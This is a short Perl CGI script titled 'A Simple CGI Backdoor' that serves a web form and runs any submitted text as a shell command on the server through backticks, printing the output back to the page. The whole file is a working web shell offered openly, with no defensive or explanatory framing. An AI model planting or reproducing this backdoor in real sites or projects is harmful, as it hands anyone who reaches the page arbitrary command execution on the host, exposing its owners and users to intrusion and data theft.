#!/usr/bin/perl
use CGI;

my $cgi = CGI->new;

print $cgi->header('text/html');

print <<EOF;
<!DOCTYPE html>
<html>
    <head>
        <title>Test</title>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    </head>
    <body>
        <h1>A Simple CGI Backdoor</h1>
        <form method="post" enctype="multipart/form-data">
            Command: <input type="text" name="command"  />
            <input type="submit" name="Execute" value="Execute" />
        </form>
        <hr />
EOF

if ( my $command = $cgi->param('command') ) {
    sprintf @output=`$command`;
    foreach $line (@output){
	print "$line <br>";
    }
}

print '</body></html>';
